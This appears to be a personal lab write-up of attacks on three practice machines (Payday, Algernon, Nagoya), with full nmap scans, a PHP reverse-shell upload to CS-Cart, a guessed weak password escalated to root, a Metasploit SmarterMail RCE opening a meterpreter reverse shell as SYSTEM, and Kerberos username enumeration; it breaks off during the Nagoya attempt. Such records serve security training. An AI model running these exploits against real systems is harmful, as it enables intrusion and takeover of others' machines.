@@ -1,0 +1,1163 @@
+┌──(kali㉿kali)-[~/payday]
+└─$ sudo nmap -sV -sC -A -Pn -sT 192.168.232.39 -p 1-65300      
+[sudo] password for kali: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-27 08:14 CEST
+Nmap scan report for 192.168.232.39
+Host is up (0.047s latency).
+Not shown: 65292 closed tcp ports (conn-refused)
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 f3:6e:87:04:ea:2d:b3:60:ff:42:ad:26:67:17:94:d5 (DSA)
+|_  2048 bb:03:ce:ed:13:f1:9a:9e:36:03:e2:af:ca:b2:35:04 (RSA)
+80/tcp  open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
+|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
+|_http-title: CS-Cart. Powerful PHP shopping cart software
+110/tcp open  pop3        Dovecot pop3d
+| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Not valid before: 2008-04-25T02:02:48
+|_Not valid after:  2008-05-25T02:02:48
+|_ssl-date: 2025-06-27T06:15:12+00:00; -27s from scanner time.
+|_pop3-capabilities: SASL TOP STLS UIDL PIPELINING CAPA RESP-CODES
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
+143/tcp open  imap        Dovecot imapd
+|_ssl-date: 2025-06-27T06:15:12+00:00; -27s from scanner time.
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+|_imap-capabilities: NAMESPACE SORT completed CHILDREN Capability IDLE LITERAL+ OK LOGINDISABLEDA0001 THREAD=REFERENCES STARTTLS SASL-IR LOGIN-REFERRALS IMAP4rev1 UNSELECT MULTIAPPEND
+| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Not valid before: 2008-04-25T02:02:48
+|_Not valid after:  2008-05-25T02:02:48
+445/tcp open  netbios-ssn Samba smbd 3.0.26a (workgroup: MSHOME)
+993/tcp open  ssl/imap    Dovecot imapd
+|_ssl-date: 2025-06-27T06:15:12+00:00; -27s from scanner time.
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+|_imap-capabilities: NAMESPACE SORT CHILDREN completed IDLE LITERAL+ Capability OK THREAD=REFERENCES AUTH=PLAINA0001 SASL-IR LOGIN-REFERRALS IMAP4rev1 UNSELECT MULTIAPPEND
+| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Not valid before: 2008-04-25T02:02:48
+|_Not valid after:  2008-05-25T02:02:48
+995/tcp open  ssl/pop3    Dovecot pop3d
+|_ssl-date: 2025-06-27T06:15:12+00:00; -27s from scanner time.
+| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Not valid before: 2008-04-25T02:02:48
+|_Not valid after:  2008-05-25T02:02:48
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+|_pop3-capabilities: SASL(PLAIN) TOP USER UIDL PIPELINING CAPA RESP-CODES
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.95%E=4%D=6/27%OT=22%CT=1%CU=41067%PV=Y%DS=4%DC=T%G=Y%TM=685E370
+OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=CA%GCD=1%ISR=EF%TI=Z%CI=Z%II=I%TS=7)SEQ(S
+OS:P=D0%GCD=1%ISR=EF%TI=Z%CI=Z%II=I%TS=7)SEQ(SP=D1%GCD=1%ISR=EF%TI=Z%CI=Z%I
+OS:I=I%TS=7)SEQ(SP=D2%GCD=1%ISR=EF%TI=Z%CI=Z%II=I%TS=7)SEQ(SP=D6%GCD=1%ISR=
+OS:EF%TI=Z%CI=Z%II=I%TS=7)OPS(O1=M578ST11NW5%O2=M578ST11NW5%O3=M578NNT11NW5
+OS:%O4=M578ST11NW5%O5=M578ST11NW5%O6=M578ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W
+OS:4=16A0%W5=16A0%W6=16A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M578NNSNW5%CC=N%Q=)T1(
+OS:R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S
+OS:=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R
+OS:=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%
+OS:UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 4 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 39m32s, deviation: 1h37m58s, median: -27s
+|_nbstat: NetBIOS name: PAYDAY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+|_smb2-time: Protocol negotiation failed (SMB2)
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.26a)
+|   Computer name: payday
+|   NetBIOS computer name: 
+|   Domain name: 
+|   FQDN: payday
+|_  System time: 2025-06-27T02:15:09-04:00
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+1   44.70 ms 192.168.45.1
+2   44.64 ms 192.168.45.254
+3   46.63 ms 192.168.251.1
+4   47.09 ms 192.168.232.39
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 52.80 seconds
+
+
+The web application running on port 80 is cs-cart. I used this guide to get a shell as www-data https://gist.github.com/momenbasel/ccb91523f86714edb96c871d4cf1d05c
+
+I uploaded the php.revese-shell.php from my kali, the I executed it from the browser and got a shell. 
+
+Linpeas shows that mysql is running locally on the PC, also netstat indicated same
+
+netstat -ltn
+netstat -ltn
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 0.0.0.0:993             0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:995             0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:110             0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:143             0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN     
+tcp6       0      0 :::80                   :::*                    LISTEN     
+tcp6       0      0 :::22                   :::*                    LISTEN 
+
+Further enumeration in the mysql data produced nothing interesting.
+
+I noticed through through linpeas output and /etc/passwd that a user Patrick has a section on the machine. I tried to access the machine as Patrick with patrick:patrick and it worked.
+
+Through this user, I got root access
+
+www-data@payday:/root$ ssu patrick
+su patrick
+Password: patrick
+
+patrick@payday:/root$ sudo -l
+sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for patrick:patrick
+
+User patrick may run the following commands on this host:
+    (ALL) ALL
+patrick@payday:/root$ sudo su
+sudo su
+root@payday:~# cd /root
+cd /root
+root@payday:~# ls
+ls
+capture.cap  proof.txt
+root@payday:~# cat proof.txt
+cat proof.txt
+e62668f0d5d6262f3e6f83d8071dfc46
+root@payday:~# 
+
+#algernon
+
+┌──(kali㉿kali)-[~/algernon]
+└─$ sudo nmap -sV -sC -A -Pn -sT 192.168.232.65 -p 1-65300      
+[sudo] password for kali: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-27 14:37 CEST
+Nmap scan report for 192.168.232.65
+Host is up (0.054s latency).
+Not shown: 65286 closed tcp ports (conn-refused)
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 04-29-20  10:31PM       <DIR>          ImapRetrieval
+| 06-27-25  05:33AM       <DIR>          Logs
+| 04-29-20  10:31PM       <DIR>          PopRetrieval
+|_06-27-25  05:33AM       <DIR>          Spool
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows
+| http-methods: 
+|_  Potentially risky methods: TRACE
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+5040/tcp  open  unknown
+9998/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-IIS/10.0
+| http-title: Site doesn't have a title (text/html; charset=utf-8).
+|_Requested resource was /interface/root
+| uptime-agent-info: HTTP/1.1 400 Bad Request\x0D
+| Content-Type: text/html; charset=us-ascii\x0D
+| Server: Microsoft-HTTPAPI/2.0\x0D
+| Date: Fri, 27 Jun 2025 12:41:04 GMT\x0D
+| Connection: close\x0D
+| Content-Length: 326\x0D
+| \x0D
+| <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">\x0D
+| <HTML><HEAD><TITLE>Bad Request</TITLE>\x0D
+| <META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>\x0D
+| <BODY><h2>Bad Request - Invalid Verb</h2>\x0D
+| <hr><p>HTTP Error 400. The request verb is invalid.</p>\x0D
+|_</BODY></HTML>\x0D
+17001/tcp open  remoting      MS .NET Remoting services
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.95%E=4%D=6/27%OT=21%CT=1%CU=37747%PV=Y%DS=4%DC=T%G=Y%TM=685E918
+OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=106%TI=I%CI=I%TS=U)SEQ(SP=1
+OS:03%GCD=1%ISR=10F%TI=I%CI=I%TS=U)SEQ(SP=104%GCD=1%ISR=10B%TI=I%CI=I%TS=U)
+OS:SEQ(SP=105%GCD=1%ISR=108%TI=I%CI=I%TS=U)SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI
+OS:=I%TS=U)OPS(O1=M578NW8NNS%O2=M578NW8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578
+OS:NW8NNS%O6=M578NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)EC
+OS:N(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=
+OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(
+OS:R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%
+OS:F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G
+OS:%RUCK=G%RUD=G)IE(R=N)
+
+Network Distance: 4 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -22s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2025-06-27T12:41:05
+|_  start_date: N/A
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+1   44.50 ms 192.168.45.1
+2   42.78 ms 192.168.45.254
+3   42.88 ms 192.168.251.1
+4   43.94 ms 192.168.232.65
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 233.47 seconds
+
+Tried to go via the port 21 anonymous login, but did not find anything interesting. Same with port 80.
+
+Port 9998 is running a SmarterMail webmail application. I researched about it and found a Metasploit exploit for it.
+
+https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/windows/http/smartermail_rce.rb
+
+msf6 > search smartermail_rce.rb
+[-] No results from search
+msf6 > search smartermail_rce
+
+Matching Modules
+================
+
+   #  Name                                    Disclosure Date  Rank       Check  Description
+   -  ----                                    ---------------  ----       -----  -----------
+   0  exploit/windows/http/smartermail_rce    2019-04-17       excellent  Yes    SmarterTools SmarterMail less than build 6985 - .NET Deserialization Remote Code Execution
+   1    \_ target: Windows Command            .                .          .      .
+   2    \_ target: x86/x64 Windows CmdStager  .                .          .      .
+
+
+Interact with a module by name or index. For example info 2, use 2 or use exploit/windows/http/smartermail_rce
+After interacting with a module you can manually set a TARGET with set TARGET 'x86/x64 Windows CmdStager'
+
+msf6 > use 0
+[*] Using configured payload cmd/windows/powershell/meterpreter/reverse_tcp
+msf6 exploit(windows/http/smartermail_rce) > options
+
+Module options (exploit/windows/http/smartermail_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   ENDPOINT   Servers          yes       Choose one of three exposed endpoints: Servers, Spool, and Mail. Example - tcp://127.0.0.1:17001/Servers
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      9998             yes       SmarterMail default HTTP port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       Base path
+   TCP_PORT   17001            yes       SmarterMail default .NET remoting port
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+
+
+Payload options (cmd/windows/powershell/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows Command
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/http/smartermail_rce) > set lhost 192.168.45.240
+lhost => 192.168.45.240
+msf6 exploit(windows/http/smartermail_rce) > set rhost 192.168.232.65
+rhost => 192.168.232.65
+msf6 exploit(windows/http/smartermail_rce) > set rport 9998
+rport => 9998
+msf6 exploit(windows/http/smartermail_rce) > options
+
+Module options (exploit/windows/http/smartermail_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   ENDPOINT   Servers          yes       Choose one of three exposed endpoints: Servers, Spool, and Mail. Example - tcp://127.0.0.1:17001/Servers
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     192.168.232.65   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      9998             yes       SmarterMail default HTTP port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       Base path
+   TCP_PORT   17001            yes       SmarterMail default .NET remoting port
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+
+
+Payload options (cmd/windows/powershell/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.45.240   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows Command
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/http/smartermail_rce) > run
+[*] Started reverse TCP handler on 192.168.45.240:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[*] Checking target web server for a response...
+[+] Target is running SmarterMail.
+[*] Checking SmarterMail product build...
+[+] Target is running SmarterMail Build 6919.
+[+] The target appears to be vulnerable.
+[*] Sending stage (177734 bytes) to 192.168.232.65
+[*] Meterpreter session 1 opened (192.168.45.240:4444 -> 192.168.232.65:50050) at 2025-06-27 17:57:13 +0200
+
+meterpreter > shell
+Process 1568 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.18363.815]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>hostname
+hostname
+algernon
+
+C:\Windows\system32>cd ..
+cd ..
+
+C:\Windows>cd ..
+cd ..
+
+C:\>cd users
+cd users
+
+C:\Users>ls
+ls
+'ls' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is F40F-37C9
+
+ Directory of C:\Users
+
+06/27/2025  05:38 AM    <DIR>          .
+06/27/2025  05:38 AM    <DIR>          ..
+04/29/2020  10:30 PM    <DIR>          .NET v4.5
+04/29/2020  10:30 PM    <DIR>          .NET v4.5 Classic
+05/02/2022  07:05 AM    <DIR>          Administrator
+04/23/2020  03:16 AM    <DIR>          dean
+06/27/2025  05:38 AM    <DIR>          DefaultAppPool
+04/22/2020  04:54 AM    <DIR>          Public
+               0 File(s)              0 bytes
+               8 Dir(s)   5,636,669,440 bytes free
+
+C:\Users>cd Administrator
+cd Administrator
+
+C:\Users\Administrator>cd Desktop
+cd Desktop
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is F40F-37C9
+
+ Directory of C:\Users\Administrator\Desktop
+
+05/02/2022  07:52 AM    <DIR>          .
+05/02/2022  07:52 AM    <DIR>          ..
+04/29/2020  09:29 PM             1,450 Microsoft Edge.lnk
+06/27/2025  05:33 AM                34 proof.txt
+               2 File(s)          1,484 bytes
+               2 Dir(s)   5,636,669,440 bytes free
+
+C:\Users\Administrator\Desktop>type proof.txt
+type proof.txt
+fdd2c9e9b1393af742c1005ee5832586
+
+C:\Users\Administrator\Desktop>
+
+
+#Nagoya
+
+┌──(kali㉿kali)-[~/nagoya]
+└─$ sudo nmap -sV -sC -A -Pn -sT 192.168.182.21 -p 1-65300      
+[sudo] password for kali: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-28 07:53 CEST
+Nmap scan report for 192.168.182.21
+Host is up (0.047s latency).
+Not shown: 65277 filtered tcp ports (no-response)
+PORT      STATE SERVICE           VERSION
+53/tcp    open  domain            Simple DNS Plus
+80/tcp    open  http              Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Nagoya Industries - Nagoya
+88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-06-28 05:55:24Z)
+135/tcp   open  msrpc             Microsoft Windows RPC
+139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ldapssl?
+3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
+3269/tcp  open  globalcatLDAPssl?
+3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
+| ssl-cert: Subject: commonName=nagoya.nagoya-industries.com
+| Not valid before: 2025-06-27T05:52:21
+|_Not valid after:  2025-12-27T05:52:21
+|_ssl-date: 2025-06-28T05:57:03+00:00; +8s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: NAGOYA-IND
+|   NetBIOS_Domain_Name: NAGOYA-IND
+|   NetBIOS_Computer_Name: NAGOYA
+|   DNS_Domain_Name: nagoya-industries.com
+|   DNS_Computer_Name: nagoya.nagoya-industries.com
+|   DNS_Tree_Name: nagoya-industries.com
+|   Product_Version: 10.0.17763
+|_  System_Time: 2025-06-28T05:56:24+00:00
+5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf            .NET Message Framing
+49666/tcp open  msrpc             Microsoft Windows RPC
+49668/tcp open  msrpc             Microsoft Windows RPC
+49676/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc             Microsoft Windows RPC
+49681/tcp open  msrpc             Microsoft Windows RPC
+49691/tcp open  msrpc             Microsoft Windows RPC
+49698/tcp open  msrpc             Microsoft Windows RPC
+49717/tcp open  msrpc             Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+Service Info: Host: NAGOYA; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-06-28T05:56:27
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 7s, deviation: 0s, median: 7s
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+1   44.28 ms 192.168.45.1
+2   43.65 ms 192.168.45.254
+3   44.39 ms 192.168.251.1
+4   47.39 ms 192.168.182.21
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 235.91 seconds
+
+
+Reviewed the web application running on port 80 on a the browser. 
+http://nagoya-industries.com/Team listed the first and last name of the team members. This name I copied in a file in my working directory and the tried to reproduce it to the standard naming conventions of companies. Kerberos userenum also helped selected those that are active directory users
+
+┌──(kali㉿kali)-[~/nagoya]
+└─$ ./username-anarchy --input-file names.txt --select-format FirstLast,firstlast,First.Last,first.last,f.last,flast > users.txt
+                                                                                                                                                                                               
+┌──(kali㉿kali)-[~/nagoya]
+└─$ nano users.txt
+                                                                                                                                                                                               
+┌──(kali㉿kali)-[~/nagoya]
+└─$ kerbrute userenum -d nagoya-industries.com users.txt --dc 192.168.182.21
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 06/28/25 - Ronnie Flathers @ropnop
+
+2025/06/28 08:14:34 >  Using KDC(s):
+2025/06/28 08:14:34 >   192.168.182.21:88
+
+2025/06/28 08:14:34 >  [+] VALID USERNAME:       matthew.harrison@nagoya-industries.com
+2025/06/28 08:14:34 >  [+] VALID USERNAME:       emma.miah@nagoya-industries.com
+2025/06/28 08:14:34 >  [+] VALID USERNAME:       rebecca.bell@nagoya-industries.com
+2025/06/28 08:14:34 >  [+] VALID USERNAME:       scott.gardner@nagoya-industries.com
+2025/06/28 08:14:34 >  [+] VALID USERNAME:       terry.edwards@nagoya-industries.com
+2025/06/28 08:14:34 >  [+] VALID USERNAME:       holly.matthews@nagoya-industries.com
+2025/06/28 08:14:34 >  [+] VALID USERNAME:       anne.jenkins@nagoya-industries.com
+2025/06/28 08:14:34 >  [+] VALID USERNAME:       brett.naylor@nagoya-industries.com
+2025/06/28 08:14:34 >  [+] VALID USERNAME:       melissa.mitchell@nagoya-industries.com
+2025/06/28 08:14:34 >  [+] VALID USERNAME:       craig.carr@nagoya-industries.com
+2025/06/28 08:14:34 >  [+] VALID USERNAME:       fiona.clark@nagoya-industries.com
+2025/06/28 08:14:34 >  [+] VALID USERNAME:       patrick.martin@nagoya-industries.com
+2025/06/28 08:14:34 >  [+] VALID USERNAME:       kate.watson@nagoya-industries.com
+2025/06/28 08:14:34 >  [+] VALID USERNAME:       kirsty.norris@nagoya-industries.com
+2025/06/28 08:14:34 >  [+] VALID USERNAME:       andrea.hayes@nagoya-industries.com
+2025/06/28 08:14:35 >  [+] VALID USERNAME:       abigail.hughes@nagoya-industries.com
+2025/06/28 08:14:35 >  [+] VALID USERNAME:       melanie.watson@nagoya-industries.com
+2025/06/28 08:14:35 >  [+] VALID USERNAME:       frances.ward@nagoya-industries.com
+2025/06/28 08:14:35 >  [+] VALID USERNAME:       sylvia.king@nagoya-industries.com
+2025/06/28 08:14:35 >  [+] VALID USERNAME:       wayne.hartley@nagoya-industries.com
+2025/06/28 08:14:35 >  [+] VALID USERNAME:       iain.white@nagoya-industries.com
+2025/06/28 08:14:35 >  [+] VALID USERNAME:       joanna.wood@nagoya-industries.com
+2025/06/28 08:14:35 >  [+] VALID USERNAME:       bethan.webster@nagoya-industries.com
+2025/06/28 08:14:35 >  [+] VALID USERNAME:       elaine.brady@nagoya-industries.com
+2025/06/28 08:14:35 >  [+] VALID USERNAME:       christopher.lewis@nagoya-industries.com
+2025/06/28 08:14:35 >  [+] VALID USERNAME:       damien.chapman@nagoya-industries.com
+2025/06/28 08:14:35 >  [+] VALID USERNAME:       joanne.lewis@nagoya-industries.com
+2025/06/28 08:14:35 >  [+] VALID USERNAME:       megan.johnson@nagoya-industries.com
+2025/06/28 08:14:35 >  Done! Tested 112 usernames (28 valid) in 0.599 seconds
+                                                                                                                                                                                                                                                                                                                                                                 
+┌──(kali㉿kali)-[~/nagoya]
+└─$ nano username1.txt
+                                                                                                                                                                                               
+┌──(kali㉿kali)-[~/nagoya]
+└─$ cat username1.txt| tr -s ' ' | sed 's/ //' | cut -d ' ' -f6                
+matthew.harrison@nagoya-industries.com
+emma.miah@nagoya-industries.com
+rebecca.bell@nagoya-industries.com
+scott.gardner@nagoya-industries.com
+terry.edwards@nagoya-industries.com
+holly.matthews@nagoya-industries.com
+anne.jenkins@nagoya-industries.com
+brett.naylor@nagoya-industries.com
+melissa.mitchell@nagoya-industries.com
+craig.carr@nagoya-industries.com
+fiona.clark@nagoya-industries.com
+patrick.martin@nagoya-industries.com
+kate.watson@nagoya-industries.com
+kirsty.norris@nagoya-industries.com
+andrea.hayes@nagoya-industries.com
+abigail.hughes@nagoya-industries.com
+melanie.watson@nagoya-industries.com
+frances.ward@nagoya-industries.com
+sylvia.king@nagoya-industries.com
+wayne.hartley@nagoya-industries.com
+iain.white@nagoya-industries.com
+joanna.wood@nagoya-industries.com
+bethan.webster@nagoya-industries.com
+elaine.brady@nagoya-industries.com
+christopher.lewis@nagoya-industries.com
+damien.chapman@nagoya-industries.com
+joanne.lewis@nagoya-industries.com
+megan.johnson@nagoya-industries.com
+
+cat username1.txt | cut -b -22 to cut in bytes and characters
+
+I tried ASP on the users but none worked. 
+
